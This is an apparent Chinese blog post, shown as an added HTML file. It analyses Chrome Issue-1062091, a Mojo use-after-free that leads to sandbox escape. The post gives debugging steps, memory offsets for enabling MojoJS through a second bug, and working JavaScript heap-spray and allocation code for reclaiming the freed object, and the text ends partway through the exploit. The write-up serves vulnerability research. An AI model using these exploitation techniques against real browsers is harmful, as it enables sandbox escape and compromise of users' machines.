@@ -1,0 +1,284 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chrome漏洞分析与利用(三)——Issue-1062091漏洞分析</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__html"><p><a href="https://mp.weixin.qq.com/s/tGwCwOQ8eAwm26fHXTCy5A">Chrome Mojo 组件的沙箱逃逸漏洞分析</a></p>
+<h1><a id="_1"></a>漏洞环境</h1>
+<h2><a id="_2"></a>漏洞说明</h2>
+<p>Issue-1062091为chrom中存在的一个UAF漏洞，此漏洞存在于chromium的Mojo框架中，利用此漏洞可以导致chrome与基于chromium的浏览器沙箱逃逸。<br>
+这个漏洞是在Chrome 81.0.4041.0的提交中引入的。在几周后，这个提交中的漏洞恰好移动到了实验版本命令行标志的后面。但是，这个更改位于Chrome 82.0.4065.0版本中，<strong>因此该漏洞在Chrome稳定版本81的所有桌面平台上都是可以利用的。</strong></p>
+<h2><a id="_5"></a>环境配置</h2>
+<p>一开始打算像调试v8漏洞那样尝试用fetch拉取代码编译带有漏洞的chromium，但是发现chromium源码下载太慢且太大，故直接下载编译好的chromium，地址:<a href="https://vikyd.github.io/download-chromium-history-version/#/">vikyd.github.io</a><br>
+<img src="https://img-blog.csdnimg.cn/7f7164911039458081e9f0a884f5a8d6.png" alt="在这里插入图片描述"><br>
+下载时除了chromium本体以外还需要将其pdb符号也一起下载<br>
+<img src="https://img-blog.csdnimg.cn/65a386dd182c490c93a1fee8c14878f2.png" alt="在这里插入图片描述"><br>
+下载好后直接将pdb符号文件与exe执行文件解压放在一起即可<br>
+<img src="https://img-blog.csdnimg.cn/6c455a6382f447ee89c91dc7cbdc99bb.png" alt="在这里插入图片描述"><br>
+最后用windbg验证是否可以正常查找函数<br>
+<img src="https://img-blog.csdnimg.cn/a6a2927c5aac4675a9d3678a21fe622d.png" alt="在这里插入图片描述"><br>
+注：下载以上内容都需要代理</p>
+<h1><a id="_15"></a>漏洞分析</h1>
+<h2><a id="POC_16"></a>POC</h2>
+<p>由于poc目录结构比较复杂，直接给出完整poc下载地址(需要代理)：<a href="https://bugs.chromium.org/p/chromium/issues/attachment?aid=437855&amp;signed_aid=4wGCQQRNEvwKK5KDgxc_MQ==">bugs.chromium.org</a><br>
+下载解压后可以得到两个html文件，其中trigger.html为我们需要的poc<br>
+<img src="https://img-blog.csdnimg.cn/e620b0d3053647ef8c8147cfa330ed52.png" alt="在这里插入图片描述"><br>
+然后尝试触发漏洞，根据说明得知chrome默认不会启用mojo，想要启用有两种方法:<br>
+一、在命令行启动chromium时加上<code> --enable-blink-features=MojoJS,MojoJSTest</code>参数。<br>
+二、利用另一个漏洞去改写当前Frame对象内部的一个变量<code>content::RenderFrameImpl::enabled_bindings_</code>让Frame拥有调用MojoJS的能力，通过以下路径可以得到该变量：</p>
+<pre><code>chrome.dll base =&gt; g_frame_map =&gt; RenderFrameImpl(main frame) =&gt; RenderFrameImpl.enabled_bindings_
+</code></pre>
+<p>关于改写变量部分具体可查看<a href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Pwn/EasyMojo#0x02-exploit">SCTF202</a>中的0x02 exploit部分，在实际利用漏洞进行攻击时肯定采用第二种方式，而此时仅需要分析利用Issue 1062091漏洞即可，所以先不去过分关心mojo开启的问题，直接采用第一种方法开启mojo。<br>
+使用windbg进行调试<br>
+<img src="https://img-blog.csdnimg.cn/e78c39ab25e54fbb800085d029f76757.png" alt="在这里插入图片描述"><br>
+在调试开始前由于当前工作目录的问题需要将poc代码中以下两处路径进行一些改动<br>
+<img src="https://img-blog.csdnimg.cn/404641905c0341c99bf65e4cfdd5236d.png" alt="在这里插入图片描述"><br>
+然后用<code>.childdbg 1</code>开启子进程调试<br>
+<img src="https://img-blog.csdnimg.cn/79751a21e4db41a38f43da83500a3192.png" alt="在这里插入图片描述"><br>
+之后经过几个<code>ntdll!LdrpDoDebuggerBreak</code>后就会触发crash<br>
+<img src="https://img-blog.csdnimg.cn/8beb0028fc34480f9088f4184b1702eb.png" alt="在这里插入图片描述"></p>
+<h2><a id="_35"></a>漏洞分析</h2>
+<p>通过观察异常信息可判断此处并非漏洞触发的第一现场，使用gflags.exe开启页堆(+hpa)与堆栈跟踪(+ust)并在启动chrome时添加–no-sandbox参数进行调试分析会发现崩溃点会转移到前一句代码<br>
+<img src="https://img-blog.csdnimg.cn/fd8ebb26fc3445edb3d0a9a2c81bb504.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/e719ebadc5674a70bcf9ff980473f452.png" alt="在这里插入图片描述"><br>
+再结合代码可以判断发生崩溃的地方是在获取render_frame_host_对象虚表<br>
+<img src="https://img-blog.csdnimg.cn/11fad64b38c9487bada5e9a3b5791433.png" alt="在这里插入图片描述"><br>
+使用!address查看该render_frame_host_对象内存信息会发现该内存已被释放<br>
+<img src="https://img-blog.csdnimg.cn/6991f0ec3269434fb006550bd7cd2e99.png" alt="在这里插入图片描述"><br>
+通过观察发现render_frame_host_对象在InstalledAppProviderImpl对象在构造时被初始化<br>
+<img src="https://img-blog.csdnimg.cn/b9949e0172cb4b25834ae507b8c97e33.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/677ab81a2b504d99a70e785fa5652f36.png" alt="在这里插入图片描述"><br>
+对content::InstalledAppProviderImpl::Create函数下断，当执行到以下内容时将会创建InstalledAppProviderImpl对象<br>
+<img src="https://img-blog.csdnimg.cn/939a4a33626f4a0e848a4421a16b19c2.png" alt="在这里插入图片描述"><br>
+而render_frame_host_保存在InstalledAppProviderImpl对象0x8偏移处<br>
+<img src="https://img-blog.csdnimg.cn/c9d42c530dcc4c5cadf504d649c215db.png" alt="在这里插入图片描述"><br>
+再结合poc可以确定InstalledAppProviderImpl对象是在sub frame调用bindInterface进行接口绑定时创建的<br>
+<img src="https://img-blog.csdnimg.cn/4c25d317f503468788b70ca6533f4955.png" alt="在这里插入图片描述"><br>
+在之后的poc执行中，父帧会通过MojoInterfaceInterceptor拦截并获取子帧的句柄<br>
+<img src="https://img-blog.csdnimg.cn/fcad53f17ae14f8f9102051a1e584d01.png" alt="在这里插入图片描述"><br>
+获取后便会调用body.removeChild删除子帧<br>
+<img src="https://img-blog.csdnimg.cn/22fc06de26ae4d1ca30b2dd941a6456d.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/2a2e459b63a44b0aadbfec029560ca95.png" alt="在这里插入图片描述"><br>
+最后会通过filterInstalledApps函数去调用已经被释放的render_frame_host_对象的虚函数<br>
+<img src="https://img-blog.csdnimg.cn/5639f711fcbe4d0aa6f2e5e570cb632f.png" alt="在这里插入图片描述"><br>
+总结poc的执行顺序大致为：</p>
+<ul>
+<li>通过window.location.hash判断是否是子帧</li>
+<li>如果是子帧就去执行Mojo.bindInterface</li>
+<li>如果是父帧就去创建子帧并用MojoInterfaceInterceptor拦截子帧的Mojo.bindInterface到并将其句柄传递给父帧</li>
+<li>释放子帧</li>
+<li>使用filterInstalledApps去调用已经被释放但却依然还留有悬挂指针的render_frame_host_虚函数</li>
+</ul>
+<h2><a id="_65"></a>漏洞利用</h2>
+<h3><a id="Mojo_66"></a>开启Mojo</h3>
+<p>上文中提到过chrome默认不能直接调用mojo，所以此处使用cve 2021-21224来配合开启mojo。<br>
+通过分析可知mojoJS的开启与关闭主要由RenderFrameImpl类成员变量enabled_bindings_与IsMainFrame函数来决定<br>
+<img src="https://img-blog.csdnimg.cn/03c2e27d41a24bbe9e8d37bcf9e3338b.png" alt="在这里插入图片描述"><br>
+IsMainFrame函数的逻辑很简单就只是将一个类成员变量返回<br>
+<img src="https://img-blog.csdnimg.cn/4a635455bf0f42c48ee4ff78e5400f82.png" alt="在这里插入图片描述"><br>
+而通过调试也可知当enabled_bindings_ &amp; 2不为0时即可满足条件<br>
+<img src="https://img-blog.csdnimg.cn/98bf8e9356e04b1e912a391f59a41ee9.png" alt="在这里插入图片描述"><br>
+也就是说此时只需要将enabled_bindings_修改为2，再将is_main_frame_修改为1即可满足条件开启mojo。<br>
+而在一个页面中可能会存在多个frame，而这些frame所对应的RenderFrameImpl对象都存储在一个全局变量g_frame_map中<br>
+<img src="https://img-blog.csdnimg.cn/cb34fc6281d94c74a5da91901aeaa5bc.png" alt="在这里插入图片描述"><br>
+要查找到全局变量g_frame_map，就需要先获取到chrome.dll的基址，利用21224构造的地址泄露函数与读写原语，泄露window对象地址，再从window对象中获取到一个位于chrome.dll模块中的地址，再用该地址减去一定的偏移来得到chrome.dll模块基址，除此以外还可以用特征码查找的方式，这种方式兼容性会更好，但在我的环境下读写原语在进行频繁的读写操作时会产生异常发生崩溃，具体原因暂时未知，所以姑且使用减去固定偏移获取基址的办法。<br>
+<img src="https://img-blog.csdnimg.cn/c9bd14be78de46a1a0d211057e779e21.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/d48dad91383c4e55b884a75f7dcbabd0.png" alt="在这里插入图片描述"><br>
+之后由于无法直接通过g_frame_map符号在windbg中使用x来查找其地址，那就通过查找调用过该全局变量的函数来查找<br>
+<img src="https://img-blog.csdnimg.cn/f844d33b511c43f39b5f97312adc7e64.png" alt="在这里插入图片描述"><br>
+之后在windbg中查找RenderFrame::ForEach并查看其汇编代码获取到g_frame_map地址为00007ffe`3d927888，用此值减去chrome基址得到偏移为0x7627888，只要使用chrome基址加0x7627888即可得到g_frame_map地址<br>
+<img src="https://img-blog.csdnimg.cn/5e0a333560694e96b05a3b5a536d8d80.png" alt="在这里插入图片描述"><br>
+g_frame_map变量8-16偏移处存放着一个链式结构，当只有一个frame时<br>
+<img src="https://img-blog.csdnimg.cn/3079fa8234b44311b13a9d61252385d2.png" alt="在这里插入图片描述"><br>
+创建sub frame后<br>
+<img src="https://img-blog.csdnimg.cn/de80ade30525419a87adac3d070caaed.png" alt="在这里插入图片描述"><br>
+而其对应的RenderFrameImpl对象保存在红线划出内存地址的0x28偏移处<br>
+<img src="https://img-blog.csdnimg.cn/a9ec54cb64cd4552907feb59163281ad.png" alt="在这里插入图片描述"><br>
+再通过观察content::RenderFrameImpl::DidCreateScriptContext函数来获取相关变量在对象中的偏移，enabled_bindings_偏移为0x560<br>
+<img src="https://img-blog.csdnimg.cn/5d1ca9360c16487f84a9a060482b1227.png" alt="在这里插入图片描述"><br>
+IsMainFrame函数中用到的have_context_变量偏移为0x88<br>
+<img src="https://img-blog.csdnimg.cn/1ef4882d654441588a563e80b74f9a1a.png" alt="在这里插入图片描述"><br>
+将g_frame_map中保存的所有RenderFrameImpl对象相应偏移修改为对应的值即可。但要注意的是在我的漏洞环境（ 81.0.4044.0）中，在获取成员变量enabled_bindings_时需要将g_frame_map中拿到的RenderFrameImpl对象地址加0x68再加enabled_bindings_所在偏移，而IsMainFrame中用到的成员变量就在g_frame_map中拿到的RenderFrameImpl对象的0x88偏移处。<br>
+<img src="https://img-blog.csdnimg.cn/7be546d300644369bbe2a4c730fc8ec7.png" alt="在这里插入图片描述"></p>
+<h3><a id="_96"></a>内存回收</h3>
+<p>对于uaf漏洞利用的第一步肯定是将此内存进行回收，而进行内存回收的前提就是先需要知道被释放的render_frame_host_占多大内存，通过前面的调试分析得知render_frame_host_为RenderFrameHostImpl类实例，所以可以先对RenderFrameHostImpl构造函数下断，而实例大小从构造函数是看不出来的，但可以从调用该实例构造函数的函数中看到。<br>
+通过kb栈回溯查看调用RenderFrameHostImpl构造函数的函数为RenderFrameHostFactory::Create<br>
+<img src="https://img-blog.csdnimg.cn/fa3e21afdd744e0889b54b82ef56f60e.png" alt="在这里插入图片描述"><br>
+通过查看该函数可知render_frame_host_对象大小为0xC38字节<br>
+<img src="https://img-blog.csdnimg.cn/13e0eaaa64a04d089608ca0c9699bedc.png" alt="在这里插入图片描述"><br>
+在知道了要回收的内存大小后就可以通过创建一系列的Blob来回收该内存</p>
+<pre><code class="prism language-js"><span class="token keyword">var</span> spray_buff <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0xC38</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> spray_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>spray_buff<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> spray_buff<span class="token punctuation">.</span>byteLength<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+	spray_view<span class="token punctuation">.</span><span class="token function">setInt8</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">//释放子帧</span>
+<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">0xA</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+	spray_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>spray_buff<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/3bdc9ecd803547208299caf45749602a.png" alt="在这里插入图片描述"><br>
+但此方法稳定性不足，不能保证能成功进行内存回收，更好的办法是采用已经被封装好的函数</p>
+<pre><code class="prism language-js"> <span class="token keyword">function</span> <span class="token function">getAllocationConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">let</span> blob_registry_ptr <span class="token operator">=</span> 
+          <span class="token keyword">new</span> <span class="token class-name">blink<span class="token punctuation">.</span>mojom<span class="token punctuation">.</span>BlobRegistryPtr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        Mojo<span class="token punctuation">.</span><span class="token function">bindInterface</span><span class="token punctuation">(</span>blink<span class="token punctuation">.</span>mojom<span class="token punctuation">.</span>BlobRegistry<span class="token punctuation">.</span>name<span class="token punctuation">,</span>
+                            mojo<span class="token punctuation">.</span><span class="token function">makeRequest</span><span class="token punctuation">(</span>
+                              blob_registry_ptr<span class="token punctuation">)</span>
+                              <span class="token punctuation">.</span>handle<span class="token punctuation">,</span> <span class="token string">"process"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">function</span> <span class="token function">Allocation</span><span class="token punctuation">(</span><span class="token parameter">size<span class="token operator">=</span><span class="token number">280</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+          <span class="token keyword">function</span> <span class="token function">ProgressClient</span><span class="token punctuation">(</span><span class="token parameter">allocate</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">function</span> <span class="token function">ProgressClientImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token punctuation">}</span>
+            <span class="token class-name">ProgressClientImpl</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token punctuation">{</span>
+              <span class="token function-variable function">onProgress</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">arg0</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>allocate<span class="token punctuation">.</span>writePromise<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+                  <span class="token keyword">this</span><span class="token punctuation">.</span>allocate<span class="token punctuation">.</span>writePromise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>arg0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+              <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span><span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>allocate <span class="token operator">=</span> allocate<span class="token punctuation">;</span>
+
+            <span class="token keyword">this</span><span class="token punctuation">.</span>ptr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mojo<span class="token punctuation">.</span>AssociatedInterfacePtrInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">var</span> progress_client_req <span class="token operator">=</span> mojo<span class="token punctuation">.</span><span class="token function">makeRequest</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>binding <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mojo<span class="token punctuation">.</span>AssociatedBinding</span><span class="token punctuation">(</span>
+              blink<span class="token punctuation">.</span>mojom<span class="token punctuation">.</span>ProgressClient<span class="token punctuation">,</span> 
+              <span class="token keyword">new</span> <span class="token class-name">ProgressClientImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+              progress_client_req
+            <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
+          <span class="token punctuation">}</span>
+
+          <span class="token keyword">this</span><span class="token punctuation">.</span>pipe <span class="token operator">=</span> Mojo<span class="token punctuation">.</span><span class="token function">createDataPipe</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+            <span class="token literal-property property">elementNumBytes</span><span class="token operator">:</span> size<span class="token punctuation">,</span> <span class="token literal-property property">capacityNumBytes</span><span class="token operator">:</span> size<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">this</span><span class="token punctuation">.</span>progressClient <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProgressClient</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          blob_registry_ptr<span class="token punctuation">.</span><span class="token function">registerFromStream</span><span class="token punctuation">(</span>
+            <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>pipe<span class="token punctuation">.</span>consumer<span class="token punctuation">,</span> 
+            <span class="token keyword">this</span><span class="token punctuation">.</span>progressClient<span class="token punctuation">.</span>ptr<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>serialized_blob <span class="token operator">=</span> res<span class="token punctuation">.</span>blob<span class="token punctuation">;</span>
+          <span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">malloc</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+              <span class="token keyword">this</span><span class="token punctuation">.</span>writePromise <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token literal-property property">resolve</span><span class="token operator">:</span> resolve<span class="token punctuation">,</span> <span class="token literal-property property">reject</span><span class="token operator">:</span> reject<span class="token punctuation">}</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>pipe<span class="token punctuation">.</span>producer<span class="token punctuation">.</span><span class="token function">writeData</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>pipe<span class="token punctuation">.</span>producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            written <span class="token operator">=</span> <span class="token keyword">await</span> promise<span class="token punctuation">;</span>
+            console<span class="token punctuation">.</span><span class="token function">assert</span><span class="token punctuation">(</span>written <span class="token operator">==</span> data<span class="token punctuation">.</span>byteLength<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token punctuation">}</span>
+
+          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">free</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>serialized_blob<span class="token punctuation">.</span>blob<span class="token punctuation">.</span>ptr<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token punctuation">}</span>
+
+          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">read</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">offset<span class="token punctuation">,</span> length</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>readpipe <span class="token operator">=</span> Mojo<span class="token punctuation">.</span><span class="token function">createDataPipe</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+              <span class="token literal-property property">elementNumBytes</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">capacityNumBytes</span><span class="token operator">:</span> length<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">this</span><span class="token punctuation">.</span>serialized_blob<span class="token punctuation">.</span>blob<span class="token punctuation">.</span><span class="token function">readRange</span><span class="token punctuation">(</span>
+              offset<span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>readpipe<span class="token punctuation">.</span>producer<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+              <span class="token keyword">this</span><span class="token punctuation">.</span>watcher <span class="token operator">=</span> <span class="token keyword">this</span>
+              <span class="token punctuation">.</span>readpipe
+              <span class="token punctuation">.</span>consumer
+              <span class="token punctuation">.</span><span class="token function">watch</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token literal-property property">readable</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">r</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+                result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">this</span><span class="token punctuation">.</span>readpipe<span class="token punctuation">.</span>consumer<span class="token punctuation">.</span><span class="token function">readData</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">this</span><span class="token punctuation">.</span>watcher<span class="token punctuation">.</span><span class="token function">cancel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token function">resolve</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>
+              <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token punctuation">}</span>
+
+          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">readQword</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">offset</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBigUint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token punctuation">}</span>
+
+          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">allocate</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+          <span class="token keyword">let</span> allocation <span class="token operator">=</span> 
+            <span class="token keyword">new</span> <span class="token class-name">Allocation</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>byteLength<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">await</span> allocation<span class="token punctuation">.</span><span class="token function">malloc</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">return</span> allocation<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">return</span> allocate<span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+      <span class="token comment">//.....</span>
+      <span class="token keyword">let</span> allocate <span class="token operator">=</span> <span class="token function">getAllocationConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">function</span> <span class="token function">spray</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+          <span class="token keyword">return</span> Promise
+          <span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token function">Array</span><span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">allocate</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token comment">// 释放</span>
+        <span class="token keyword">let</span> ptr <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getFreedPtr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// 回收</span>
+        <span class="token keyword">let</span> sa  <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">spray</span><span class="token punctuation">(</span>spray_buff<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// 触发漏洞</span>
+      
+</code></pre>
+<h3><a id="_220"></a>避免崩溃</h3>
+<h4><a id="_221"></a>堆地址泄露</h4>
+<p>此时由于原本存放render_frame_host_对象的内存现在被blob所占用，所以当调用render_frame_host_对象虚函数GetProcess时就会去调用spray_buff中的元素值+0x48处，而spray_buff对应位置值为0x4141414141414141所以此时依然会触发崩溃<br>
+<img src="https://img-blog.csdnimg.cn/3f2ec62830b948cda9c7a3179a732c0b.png" alt="在这里插入图片描述"><br>
+所以此时需要填入相应的函数地址，保证在执行GetProcess与GetBrowserContest两个虚函数时不会发生崩溃，并在执行IsOffTheRecord时能够泄露堆地址。<br>
+通过查找可以首先找到一个符合条件的函数ChromeMainDelegate::CreateContentClient，此函数会将this+8处地址返回给调用者，可以将此函数地址填入堆喷占位的数据中，在调用GetProcess与GetBrowserContext虚函数时就回去调用此函数。<br>
+<img src="https://img-blog.csdnimg.cn/8f76543fd4e34cbdb3e44104141c2aab.png" alt="在这里插入图片描述"><br>
+再查找到ChromeMainDelegate类虚表<br>
+<img src="https://img-blog.csdnimg.cn/41af5be5058747889b0ec9e506b7c3f2.png" alt="在这里插入图片描述"><br>
+查看虚表得知ChromeMainDelegate::CreateContentClient函数地址存放在起虚表的0x70偏移处。<br>
+<img src="https://img-blog.csdnimg.cn/47b5ffa2ac8b454daa5f327b7497e39d.png" alt="在这里插入图片描述"><br>
